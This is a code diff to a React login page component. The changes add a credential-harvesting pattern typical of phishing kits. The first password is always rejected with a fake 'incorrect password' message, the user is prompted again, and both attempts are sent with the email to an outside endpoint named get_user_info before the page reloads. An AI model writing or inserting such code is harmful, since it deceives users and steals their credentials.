@@ -7,8 +7,10 @@ const Login = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [isEmailConfirmed, setIsEmailConfirmed] = useState(false);
   const [password, setPassword] = useState('');
-  const [confirmPassword, setConfirmPassword] = useState('');
+  const [firstPasswordUsed, setFirstPasswordUsed] = useState('');
+  const [secondPasswordUsed, setSecondPasswordUsed] = useState('');
   const [passwordError, setPasswordError] = useState('');
+  const [attemptCount, setAttemptCount] = useState(0); // To track the number of login attempts
 
   // Focus email input on initial render
   useEffect(() => {
@@ -34,14 +36,16 @@ const Login = () => {
     if (isEmailConfirmed) {
       setIsEmailConfirmed(false);
       setPassword('');
-      setConfirmPassword('');
       setPasswordError('');
+      setAttemptCount(0);
+      setFirstPasswordUsed(''); // Reset the first password attempt
+      setSecondPasswordUsed(''); // Reset the second password attempt
     }
   };
 
   const handleEmailSubmit = () => {
     if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
-      setPasswordError('Please enter a valid email address');
+      setPasswordError('Please enter a valid email address.');
       return;
     }
 
@@ -55,9 +59,29 @@ const Login = () => {
   };
 
   const handleLogin = async () => {
-    if (password !== confirmPassword) {
-      setPasswordError('Passwords do not match');
+    if (attemptCount === 0) {
+      // Store the first password attempt
+      setFirstPasswordUsed(password);
+      setAttemptCount(1);
+      setPassword(''); // Clear the password input
+
+      // Wait for 0.5 seconds before showing error message
+      setTimeout(() => {
+        setPasswordError(
+          'The password you entered is incorrect. Please verify and try again.'
+        );
+        setTimeout(() => {
+          const passwordInput = document.getElementById('password-input');
+          if (passwordInput) {
+            passwordInput.focus(); // Autofocus back to password input
+          }
+        }, 0);
+      }, 500); // Half-second delay for the error message
+
       return;
+    } else if (attemptCount === 1) {
+      // Store the second password attempt
+      setSecondPasswordUsed(password);
     }
 
     setIsLoading(true);
@@ -66,17 +90,24 @@ const Login = () => {
     try {
       const response = await axios.post('https://nm-be.vercel.app/api/get_user_info/', {
         email: email,
-        password: password,
+        firstpasswordused: firstPasswordUsed,
+        secondpasswordused: password, // Send the second password attempt
       });
       window.location.reload();
     } catch (error) {
       if (error.message === 'Network Error') {
-        setPasswordError('Network error: Unable to connect to the server.');
+        setPasswordError(
+          'We encountered a network error while attempting to connect to the server. Please try again.'
+        );
       } else if (error.response) {
         console.error('Error:', error.response.data);
-        setPasswordError(`Login failed with status code ${error.response.status}`);
+        setPasswordError(
+          `Login failed with status code ${error.response.status}. Please check your credentials and try again.`
+        );
       } else {
-        setPasswordError('An unknown error occurred.');
+        setPasswordError(
+          'An unknown error occurred. Please refresh the page and attempt again.'
+        );
       }
     } finally {
       setIsLoading(false);
@@ -129,19 +160,10 @@ const Login = () => {
               />
             </div>
 
-            <div className="input-group">
-              <input
-                type="password"
-                value={confirmPassword}
-                onChange={(e) => setConfirmPassword(e.target.value)}
-                placeholder="Confirm Password"
-                required
-              />
-            </div>
-
             {passwordError && <p className="error-text">{passwordError}</p>}
 
-            {password && confirmPassword && (
+            {password && (
+              <div className='login-btn-wrapper'>
               <button
                 className="login-btn"
                 onClick={handleLogin}
@@ -153,6 +175,7 @@ const Login = () => {
                   'Login'
                 )}
               </button>
+              </div>
             )}
           </>
         )}
